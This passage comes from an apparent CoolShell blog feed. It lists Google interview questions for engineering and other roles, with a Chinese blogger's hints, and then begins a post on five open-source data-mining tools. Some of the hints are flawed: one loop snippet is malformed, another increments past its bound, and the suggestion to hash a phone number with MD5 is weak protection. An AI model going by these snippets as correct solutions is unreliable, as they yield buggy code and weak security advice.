<li>There’s a latency problem in South Africa. Diagnose it. （陈皓：这个问题完全是在考你的解决问题的能力。没有明确的答案。不过，解决性能问题的第一步通常是找出瓶颈，找瓶颈有很多种方法，工具，二分查，时间记录等等。）</li>
<li>What are three long term challenges facing Google?</li>
<li>Name three non-Google websites that you visit often and like. What do you like about the user interface and design? Choose one of the three sites and comment on what new feature or project you would work on. How would you design it?</li>
<li>If there is only one elevator in the building, how would you change the design? How about if there are only two elevators in the building? （陈皓：经典的电梯设计问题，这种问题千变万化，主要是考你的设计能力和需求变化的适变能力，与此相似的是酒店订房系统。）</li>
<li>How many vacuum’s are made per year in USA?</li>
</ul>
</div>
</div>
<div>
<div><strong>Software Engineer</strong></div>
<div>
<div>
<ul>
<li>Why are manhole covers round? （陈皓：为什么下水井盖是圆的？这是有N种答案的，上Wiki看看吧）</li>
<li>What is the difference between a mutex and a semaphore? Which one would you use to protect access to an increment operation?</li>
<li>A man pushed his car to a hotel and lost his fortune. What happened? （陈皓：脑筋急转弯？他在玩大富翁游戏？！！）</li>
<li>Explain the significance of “dead beef”.（陈皓：要是你看到的是16进制 DEAD BEEF，你会觉得这是什么？IPv6的地址？）</li>
<li>Write a C program which measures the the speed of a context switch on a UNIX/Linux system.</li>
<li>Given a function which produces a random integer in the range 1 to 5, write a function which produces a random integer in the range 1 to 7.（陈皓：上StackOverflow看看吧，经典的问题）</li>
<li>Describe the algorithm for a depth-first graph traversal.</li>
<li>Design a class library for writing card games. （陈皓：用一系列的类来设计一个扑克游戏，设计题）</li>
<li>You need to check that your friend, Bob, has your correct phone number, but you cannot ask him directly. You must write a the question on a card which and give it to Eve who will take the card to Bob and return the answer to you. What must you write on the card, besides the question, to ensure Bob can encode the message so that Eve cannot read your phone number?（陈皓：协议+数字加密，我试想了一个，纸条上可以这样写，“Bob，请把我的手机号以MD5算法加密后的字符串，比对下面的字符串——XXXXXX，它们是一样的吗？”）</li>
<li>How are cookies passed in the HTTP protocol?</li>
<li>Design the SQL database tables for a car rental database.</li>
<li>Write a regular expression which matches a email address. （陈皓：上StackOverflow查相当的问题吧。）</li>
<li>Write a function f(a, b) which takes two character string arguments and returns a string containing only the characters found in both strings in the order of a. Write a version which is order N-squared and one which is order N.（陈皓：算法题，不难，不说了。一个O(n^2)和一个O(n)的算法复杂度）</li>
<li>You are given a the source to a application which is crashing when run. After running it 10 times in a debugger, you find it never crashes in the same place. The application is single threaded, and uses only the C standard library. What programming errors could be causing this crash? How would you test each one? （陈皓：和随机数有关系？或是时间？）</li>
<li>Explain how congestion control works in the TCP protocol.</li>
<li>In Java, what is the difference between final, finally, and finalize?</li>
<li>What is multithreaded programming? What is a deadlock?</li>
<li>Write a function (with helper functions if needed) called to Excel that takes an excel column value (A,B,C,D…AA,AB,AC,… AAA..) and returns a corresponding integer value (A=1,B=2,… AA=26..).</li>
<li>You have a stream of infinite queries (ie: real time Google search queries that people are entering). Describe how you would go about finding a good estimate of 1000 samples from this never ending set of data and then write code for it.</li>
<li>Tree search algorithms. Write BFS and DFS code, explain run time and space requirements. Modify the code to handle trees with weighted edges and loops with BFS and DFS, make the code print out path to goal state.</li>
<li>You are given a list of numbers. When you reach the end of the list you will come back to the beginning of the list (a circular list). Write the most efficient algorithm to find the minimum # in this list. Find any given # in the list. The numbers in the list are always increasing but you don’t know where the circular list begins, ie: 38, 40, 55, 89, 6, 13, 20, 23, 36. （陈皓：循环排序数组的二分查找问题）</li>
<li>Describe the data structure that is used to manage memory. (stack)</li>
<li>What’s the difference between local and global variables?</li>
<li>If you have 1 million integers, how would you sort them efficiently? (modify a specific sorting algorithm to solve this)</li>
<li>In Java, what is the difference between static, final, and const. (if you don’t know Java they will ask something similar for C or C++).</li>
<li>Talk about your class projects or work projects (pick something easy)… then describe how you could make them more efficient (in terms of algorithms).</li>
<li>Suppose you have an NxN matrix of positive and negative integers. Write some code that finds the sub-matrix with the maximum sum of its elements.（陈皓：以前见过一维数组的这个问题，现在是二维的。感觉应该是把二维的第一行的最大和的区间算出来，然后再在这个基础之上进行二维的分析。思路应该是这个，不过具体的算法还需要想一想）</li>
<li>Write some code to reverse a string.</li>
<li>Implement division (without using the divide operator, obviously).（陈皓：想一想手算除法的过程。）</li>
<li>Write some code to find all permutations of the letters in a particular string.</li>
<li>What method would you use to look up a word in a dictionary? （陈皓：使用排序，哈希，树等算法和数据结构）</li>
<li>Imagine you have a closet full of shirts. It’s very hard to find a shirt. So what can you do to organize your shirts for easy retrieval?</li>
<li>You have eight balls all of the same size. 7 of them weigh the same, and one of them weighs slightly more. How can you fine the ball that is heavier by using a balance and only two weighings?</li>
<li>What is the C-language command for opening a connection with a foreign host over the internet?</li>
<li>Design and describe a system/application that will most efficiently produce a report of the top 1 million Google search requests. These are the particulars: 1) You are given 12 servers to work with. They are all dual-processor machines with 4Gb of RAM, 4x400GB hard drives and networked together.(Basically, nothing more than high-end PC’s) 2) The log data has already been cleaned for you. It consists of 100 Billion log lines, broken down into 12 320 GB files of 40-byte search terms per line. 3) You can use only custom written applications or available free open-source software.</li>
<li>There is an array A[N] of N numbers. You have to compose an array Output[N] such that Output[i] will be equal to multiplication of all the elements of A[N] except A[i]. For example Output[0] will be multiplication of A[1] to A[N-1] and Output[1] will be multiplication of A[0] and from A[2] to A[N-1]. Solve it without division operator and in O(n).（陈皓：注意其不能使用除法。算法思路是这样的，把output[i]=a[i]左边的乘积 x a[i]右边的乘积，所以，我们可以分两个循环，第一次先把A[i]左边的乘积放在Output[i]中，第二次把A[i]右边的乘积算出来。我们先看第一次的循环，使用迭代累积的方式，代码如下：for(r=1; i=0; i&lt;n-1; i++){ Output[i]=r; r*=a[i]; }，看明白了吧。第二次的循环我就不说了，方法一样的。）</li>
<li>There is a linked list of numbers of length N. N is very large and you don’t know N. You have to write a function that will return k random numbers from the list. Numbers should be completely random. Hint: 1. Use random function rand() (returns a number between 0 and 1) and irand() (return either 0 or 1) 2. It should be done in O(n).（陈皓：本题其实不难。在遍历链表的同时一边生成随机数，一边记录最大的K个随机数和其链接地址。）</li>
<li>Find or determine non existence of a number in a sorted list of N numbers where the numbers range over M, M&gt;&gt; N and N large enough to span multiple disks. Algorithm to beat O(log n) bonus points for constant time algorithm.（陈皓：使用bitmap，如果一个长整形有64位，那么我们可以使用M/64个bitmap）</li>
<li>You are given a game of Tic Tac Toe. You have to write a function in which you pass the whole game and name of a player. The function will return whether the player has won the game or not. First you to decide which data structure you will use for the game. You need to tell the algorithm first and then need to write the code. Note: Some position may be blank in the game। So your data structure should consider this condition also.</li>
<li>You are given an array [a1 To an] and we have to construct another array [b1 To bn] where bi = a1*a2*…*an/ai. you are allowed to use only constant space and the time complexity is O(n). No divisions are allowed.（陈皓：前面说过了）</li>
<li>How do you put a Binary Search Tree in an array in a efficient manner. Hint :: If the node is stored at the ith position and its children are at 2i and 2i+1(I mean level order wise)Its not the most efficient way.（陈皓：按顺序遍历树）</li>
<li>How do you find out the fifth maximum element in an Binary Search Tree in efficient manner. Note: You should not use use any extra space. i.e sorting Binary Search Tree and storing the results in an array and listing out the fifth element.</li>
<li>Given a Data Structure having first n integers and next n chars. A = i1 i2 i3 … iN c1 c2 c3 … cN.Write an in-place algorithm to rearrange the elements of the array ass A = i1 c1 i2 c2 … in cn（陈皓：这个算法其实就是从中间开始交换元素，代码：for(i=n-1; i&gt;1; i++) {  for(j=i; j&lt;2*n-i; j+=2) { swap(a[j], a[j+1]); } }，不好意思写在同一行上了。）</li>
<li>Given two sequences of items, find the items whose absolute number increases or decreases the most when comparing one sequence with the other by reading the sequence only once.</li>
<li>Given That One of the strings is very very long , and the other one could be of various sizes. Windowing will result in O(N+M) solution but could it be better? May be NlogM or even better?</li>
<li>How many lines can be drawn in a 2D plane such that they are equidistant from 3 non-collinear points?</li>
<li>Let’s say you have to construct Google maps from scratch and guide a person standing on Gateway of India (Mumbai) to India Gate(Delhi). How do you do the same?</li>
<li>Given that you have one string of length N and M small strings of length L. How do you efficiently find the occurrence of each small string in the larger one?</li>
<li>Given a binary tree, programmatically you need to prove it is a binary search tree.</li>
<li>You are given a small sorted list of numbers, and a very very long sorted list of numbers – so long that it had to be put on a disk in different blocks. How would you find those short list numbers in the bigger one?</li>
<li>Suppose you have given N companies, and we want to eventually merge them into one big company. How many ways are theres to merge?</li>
<li>Given a file of 4 billion 32-bit integers, how to find one that appears at least twice? （陈皓：我能想到的是拆分成若干个小数组，排序，然后一点点归并起来）</li>
<li>Write a program for displaying the ten most frequent words in a file such that your program should be efficient in all complexity measures.（陈皓：你可能需要看看这篇文章<a href="http://www.cs.rutgers.edu/~farach/pubs/FrequentStream.pdf" target="_blank"><span style="text-decoration: underline;">Finding Frequent Items in Data Streams</span></a>）</li>
<li>Design a stack. We want to push, pop, and also, retrieve the minimum element in constant time.</li>
<li>Given a set of coin denominators, find the minimum number of coins to give a certain amount of change.（陈皓：你应该查看一下这篇文章：<a href="http://www.algorithmist.com/index.php/Coin_Change" target="_blank"><span style="text-decoration: underline;">Coin Change Problem</span></a>）</li>
<li>Given an array, i) find the longest continuous increasing subsequence. ii) find the longest increasing subsequence.（陈皓：这个题不难，O(n)算法是边遍历边记录当前最大的连续的长度。）</li>
<li>Suppose we have N companies, and we want to eventually merge them into one big company. How many ways are there to merge?</li>
<li>Write a function to find the middle node of a single link list. （陈皓：我能想到的算法是——设置两个指针p1和p2，每一次，p1走两步，p2走一步，这样，当p1走到最后时，p2就在中间）</li>
<li>Given two binary trees, write a compare function to check if they are equal or not. Being equal means that they have the same value and same structure.（陈皓：这个很简单，使用递归算法。）</li>
<li>Implement put/get methods of a fixed size cache with LRU replacement algorithm.</li>
<li>You are given with three sorted arrays ( in ascending order), you are required to find a triplet ( one element from each array) such that distance is minimum. Distance is defined like this : If a[i], b[j] and c[k] are three elements then distance=max(abs(a[i]-b[j]),abs(a[i]-c[k]),abs(b[j]-c[k]))” Please give a solution in O(n) time complexity（陈皓：三个指针，a, b, c分别指向三个数组头，假设：a[0]&lt;b[0]&lt;c[0]，推进a直到a[i]&gt;b[0]，计算 abs(a[i-1] – c[0])，把结果保存在min中。现在情况变成找 a[i], b[0],c[0]，重复上述过程，如果有一个新的值比min要小，那就取代现有的min。）</li>
<li>How does C++ deal with constructors and deconstructors of a class and its child class?</li>
<li>Write a function that flips the bits inside a byte (either in C++ or Java). Write an algorithm that take a list of n words, and an integer m, and retrieves the mth most frequent word in that list.</li>
<li>What’s 2 to the power of 64?</li>
<li>Given that you have one string of length N and M small strings of length L. How do you efficiently find the occurrence of each small string in the larger one? （陈皓：我能想到的是——把那M个小字串排个序，然后遍历大字串，并在那M个字串中以二分取中的方式查找。）</li>
<li>How do you find out the fifth maximum element in an Binary Search Tree in efficient manner.</li>
<li>Suppose we have N companies, and we want to eventually merge them into one big company. How many ways are there to merge?</li>
<li>There is linked list of millions of node and you do not know the length of it. Write a function which will return a random number from the list.</li>
<li>You need to check that your friend, Bob, has your correct phone number, but you cannot ask him directly. You must write a the question on a card which and give it to Eve who will take the card to Bob and return the answer to you. What must you write on the card, besides the question, to ensure Bob can encode the message so that Eve cannot read your phone number?</li>
<li>How long it would take to sort 1 trillion numbers? Come up with a good estimate.</li>
<li>Order the functions in order of their asymptotic performance: 1) 2^n 2) n^100 3) n! 4) n^n</li>
<li>There are some data represented by(x,y,z). Now we want to find the Kth least data. We say (x1, y1, z1) &gt; (x2, y2, z2) when value(x1, y1, z1) &gt; value(x2, y2, z2) where value(x,y,z) = (2^x)*(3^y)*(5^z). Now we can not get it by calculating value(x,y,z) or through other indirect calculations as lg(value(x,y,z)). How to solve it?</li>
<li>How many degrees are there in the angle between the hour and minute hands of a clock when the time is a quarter past three?</li>
<li>Given an array whose elements are sorted, return the index of a the first occurrence of a specific integer. Do this in sub-linear time. I.e. do not just go through each element searching for that element.</li>
<li>Given two linked lists, return the intersection of the two lists: i.e. return a list containing only the elements that occur in both of the input lists. （陈皓：把第一个链表存入hash表，然后遍历第二个链表。不知道还没有更好的方法。）</li>
<li>What’s the difference between a hashtable and a hashmap?</li>
<li>If a person dials a sequence of numbers on the telephone, what possible words/strings can be formed from the letters associated with those numbers?（陈皓：这个问题和美国的电话有关系，大家可以试着想一下我们发短信的手机，按数字键出字母，一个组合的数学问题。）</li>
<li>How would you reverse the image on an n by n matrix where each pixel is represented by a bit?</li>
<li>Create a fast cached storage mechanism that, given a limitation on the amount of cache memory, will ensure that only the least recently used items are discarded when the cache memory is reached when inserting a new item. It supports 2 functions: String get(T t) and void put(String k, T t).</li>
<li>Create a cost model that allows Google to make purchasing decisions on to compare the cost of purchasing more RAM memory for their servers vs. buying more disk space.</li>
<li>Design an algorithm to play a game of Frogger and then code the solution. The object of the game is to direct a frog to avoid cars while crossing a busy road. You may represent a road lane via an array. Generalize the solution for an N-lane road.</li>
<li>What sort would you use if you had a large data set on disk and a small amount of ram to work with?</li>
<li>What sort would you use if you required tight max time bounds and wanted highly regular performance.</li>
<li>How would you store 1 million phone numbers?（陈皓：试想电话是有区段的，可以把区段统一保存，Flyweight设计模式）</li>
<li>Design a 2D dungeon crawling game. It must allow for various items in the maze – walls, objects, and computer-controlled characters. (The focus was on the class structures, and how to optimize the experience for the user as s/he travels through the dungeon.)</li>
<li>What is the size of the C structure below on a 32-bit system? On a 64-bit? （陈皓：注意编译器的对齐）</li>
</ul>
<p style="padding-left: 90px;">struct foo {</p>
<div style="padding-left: 90px;">char a;</div>
<div style="padding-left: 90px;">char* b;</div>
<div style="padding-left: 90px;">};</div>
</div>
</div>
<div><strong>Software Engineer in Test</strong></div>
<div>
<ul>
<li>Efficiently implement 3 stacks in a single array.</li>
<li>Given an array of integers which is circularly sorted, how do you find a given integer.</li>
<li>Write a program to find depth of binary search tree without using recursion.</li>
<li>Find the maximum rectangle (in terms of area) under a histogram in linear time.</li>
<li>Most phones now have full keyboards. Before there there three letters mapped to a number button. Describe how you would go about implementing spelling and word suggestions as people type.</li>
<li>Describe recursive mergesort and its runtime. Write an iterative version in C++/Java/Python.</li>
<li>How would you determine if someone has won a game of tic-tac-toe on a board of any size?</li>
<li>Given an array of numbers, replace each number with the product of all the numbers in the array except the number itself *without* using division.</li>
<li>Create a cache with fast look up that only stores the N most recently accessed items.</li>
<li>How to design a search engine? If each document contains a set of keywords, and is associated with a numeric attribute, how to build indices?</li>
<li>Given two files that has list of words (one per line), write a program to show the intersection.</li>
<li>What kind of data structure would you use to index annagrams of words? e.g. if there exists the word “top” in the database, the query for “pot” should list that.</li>
</ul>
<div>
<div><strong>Quantitative Compensation Analyst</strong></div>
</div>
</div>
<div>
<ul>
<li>What is the yearly standard deviation of a stock given the monthly standard deviation?</li>
<li>How many resumes does Google receive each year for software engineering?</li>
<li>Anywhere in the world, where would you open up a new Google office and how would you figure out compensation for all the employees at this new office?</li>
<li>What is the probability of breaking a stick into 3 pieces and forming a triangle?</li>
</ul>
</div>
<div><strong>Engineering Manager</strong></div>
<div>
<ul>
<li>You’re the captain of a pirate ship, and your crew gets to vote on how the gold is divided up. If fewer than half of the pirates agree with you, you die. How do you recommend apportioning the gold in such a way that you get a good share of the booty, but still survive?</li>
</ul>
</div>
<div><strong>AdWords Associate</strong></div>
<div>
<ul>
<li>How would you work with an advertiser who was not seeing the benefits of the AdWords relationship due to poor conversions?</li>
<li>How would you deal with an angry or frustrated advertisers on the phone?</li>
</ul>
</div>
<div><span style="font-size: small;"><em>Sources</em></span></div>
<div style="padding-left: 30px;"><span><span style="font-size: small;"><a href="https://news.ycombinator.com/item?id=266663" target="_blank">http://news.ycombinator.com/item?id=266663</a> </span></span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://tihomir.org/crazy-questions-at-google-job-interview/" target="_blank">http://tihomir.org/crazy-questions-at-google-job-interview/</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://www.drizzle.com/~jpaint/google.html" target="_blank">http://www.drizzle.com/~jpaint/google.html</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://www.gamedev.net/community/forums/topic.asp?topic_id=299692" target="_blank">http://www.gamedev.net/community/forums/topic.asp?topic_id=299692</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://careers.cse.sc.edu/googleinterview" target="_blank">http://careers.cse.sc.edu/googleinterview</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://job-interview.blogspot.com/2005/02/google-interview-product-marketing.html" target="_blank">http://job-interview.blogspot.com/2005/02/google-interview-product-marketing.html</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://www.theregister.co.uk/2007/01/05/google_interview_tales/" target="_blank">http://www.theregister.co.uk/2007/01/05/google_interview_tales/</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://money.cnn.com/2007/08/29/technology/brain_teasers.biz2/index.htm" target="_blank">http://money.cnn.com/2007/08/29/technology/brain_teasers.biz2/index.htm</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://money.cnn.com/2007/08/29/technology/brain_teasers.biz2/index.htm" target="_blank">http://blogs.lessthandot.com/index.php/ITProfessionals/EthicsIT/google-interview-questions</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://placementsindia.blogspot.com/2007/09/google-top-interview-puzzles.html" target="_blank">http://placementsindia.blogspot.com/2007/09/google-top-interview-puzzles.html</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://linkmingle.com/user/interview_questions/google_interview_questions" target="_blank">http://linkmingle.com/user/interview_questions/google_interview_questions</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://discuss.joelonsoftware.com/default.asp?interview.11.626758.33" target="_blank">http://discuss.joelonsoftware.com/default.asp?interview.11.626758.33</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="http://mindcipher.com/puzzle/78-clock-works" target="_blank">http://mindcipher.com/puzzle/78-clock-works</a><br>
</span></div>
<div style="padding-left: 30px;"><span style="font-size: small;"><a href="https://www.glassdoor.com" target="_blank">http://www.glassdoor.com</a></span></div>
<div style="padding-left: 30px;">
<div><span style="font-size: small;"><a href="http://bluepixel.ca/blog/?p=69" target="_blank">http://bluepixel.ca/blog/?p=69</a></span></div>
<div>
<span style="font-size: small;"> </span><span style="font-size: small;"><a href="http://www.businessinsider.com/my-nightmare-interviews-with-google-2009-11" target="_blank">http://www.businessinsider.com/my-nightmare-interviews-with-google-2009-11</a></span>
</div>
<div><span style="font-size: small;"><br>
</span></div>
</div>
</div>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4976.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4976.html" class="wp_rp_title">给程序员新手的一些建议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4506.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4506.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（上）</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4490.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4490.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（下）</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3345" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="f8afd6fbc9">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>23</strong> 人打了分，平均分： <strong>4.17</strong> )<br><span class="post-ratings-text" id="ratings_3345_text"></span><meta itemprop="name" content="140个Google的面试题">
<meta itemprop="headline" content="140个Google的面试题">
<meta itemprop="description" content="来源：http://blog.seattleinterviewcoach.com/2009/02/140-google-interview-questions.html（墙）

某猎头收集了140多个Google的面试题，都张到他的Blog中了，主要是下面这些职位的，因为被墙，且无任何敏感信息，所以，我原文搬过来了。


	Product Marketing Manager
	Prod...">
<meta itemprop="datePublished" content="2010-12-02T08:44:24+08:00">
<meta itemprop="dateModified" content="2011-04-11T08:03:22+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3345.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3345.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.17">
<meta itemprop="ratingCount" content="23">
</div>
</div>
<div id="post-ratings-3345-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-02T08:44:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/3345.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 五个免费开源的数据挖掘软件 ]]></title>
<link>https://coolshell.cn/articles/3356.html</link>
<content><![CDATA[ 
<p>在网上看到一篇文章介绍五个免费开源的数据挖掘软件，转过来。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Orange" title="Orange">Orange</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#RapidMiner" title="RapidMiner">RapidMiner</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Weka" title="Weka">Weka</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#JHepWork" title="JHepWork">JHepWork</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#KNIME" title="KNIME">KNIME</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Orange"></span>Orange<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.ailab.si/orange"><img alt="image placeholder" ></a><a href="http://www.ailab.si/orange">Orange</a> 是一个基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，基绑定了Python以进行脚本开发。它包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。其由C++ 和 Python开发，它的图形库是由跨平台的Qt框架开发。</p>
<h4>
<span class="ez-toc-section" id="RapidMiner"></span>RapidMiner<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://rapidminer.com/" target="_blank"><img alt="image placeholder" ></a><a href="https://rapidminer.com/" target="_blank">RapidMiner</a>, 以前叫 YALE (Yet Another Learning Environment), 其是一个给机器学习和数据挖掘和分析的试验环境，同时用于研究了真实世界数据挖掘。它提供的实验由大量的算子组成，而这些算子由详细的XML 文件记录，并被RapidMiner图形化的用户接口表现出来。RapidMiner为主要的机器学习过程提供了超过500算子，并且，其结合了学习方案和Weka学习环境的属性评估器。它是一个独立的工具可以用来做数据分析，同样也是一个数据挖掘引擎可以用来集成到你的产品中。</p>
<p><span id="more-3356"></span></p>
<h4>
<span class="ez-toc-section" id="Weka"></span>Weka<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.cs.waikato.ac.nz/~ml/weka/" target="_blank"><img alt="image placeholder" ></a>由Java开发的 <a href="http://www.cs.waikato.ac.nz/~ml/weka/" target="_blank">Weka</a> (Waikato Environment for Knowledge Analysis) 是一个知名机器学机软件，其支持几种经典的数据挖掘任务，显著的数据预处理，集群，分类，回归，虚拟化，以及功能选择。其技术基于假设数据是以一种单个文件或关联的，在那里，每个数据点都被许多属性标注。 Weka 使用Java的数据库链接能力可以访问SQL数据库，并可以处理一个数据库的查询结果。它主要的用户接品是Explorer，也同样支持相同功能的命令行，或是一种基于组件的知识流接口。</p>
<h4>
<span class="ez-toc-section" id="JHepWork"></span>JHepWork<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://jwork.org/jhepwork/" target="_blank"><img alt="image placeholder" ></a>为科学家，工程师和学生所设计的 <a href="http://jwork.org/jhepwork/" target="_blank">jHepWork</a> 是一个免费的开源数据分析框架，其主要是用开源库来创建 一个数据分析环境，并提供了丰富的用户接口，以此来和那些收费的的软件竞争。它主要是为了科学计算用的二维和三维的制图，并包含了用Java实现的数学科学库，随机数，和其它的数据挖掘算法。 jHepWork 是基于一个高级的编程语言 Jython，当然，Java代码同样可以用来调用 jHepWork 的数学和图形库。</p>
<h4>
<span class="ez-toc-section" id="KNIME"></span>KNIME<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.knime.org/" target="_blank"><img alt="image placeholder" ></a><a href="http://www.knime.org/" target="_blank">KNIME</a> (Konstanz Information Miner) 是一个用户友好，智能的，并有丰演的开源的数据集成，数据处理，数据分析和数据勘探平台。它给了用户有能力以可视化的方式创建数据流或数据通道，可选择性地运行一些或全部的分析步骤，并以后面研究结果，模型 以及 可交互的视图。 KNIME 由Java写成，其基于 Eclipse 并通过插件的方式来提供更多的功能。通过以插件的文件，用户可以为文件，图片，和时间序列加入处理模块，并可以集成到其它各种各样的开源项目中，比如：R语言，Weka， Chemistry Development Kit, 和 LibSVM.</p>
<p>源文：<a href="http://www.junauza.com/2010/11/free-data-mining-software.html">http://www.junauza.com/2010/11/free-data-mining-software.html</a>（墙）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/1426.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1426.html" class="wp_rp_title">Oracle的战书！</a>
</li>
<li>
<a href="https://coolshell.cn/articles/189.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/189.html" class="wp_rp_title">Linux的15岁生日</a>
</li>
<li>
<a href="https://coolshell.cn/articles/325.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/325.html" class="wp_rp_title">2009年脚本语言排名</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4875.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4875.html" class="wp_rp_title">一个空格引发的惨剧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5651.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5651.html" class="wp_rp_title">Stay Hungry, Stay Foolish ！！</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2015.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2015.html" class="wp_rp_title">google的免费dns服务器</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3356" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="40a8dc21ac">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>9</strong> 人打了分，平均分： <strong>3.33</strong> )<br><span class="post-ratings-text" id="ratings_3356_text"></span><meta itemprop="name" content="五个免费开源的数据挖掘软件">
<meta itemprop="headline" content="五个免费开源的数据挖掘软件">
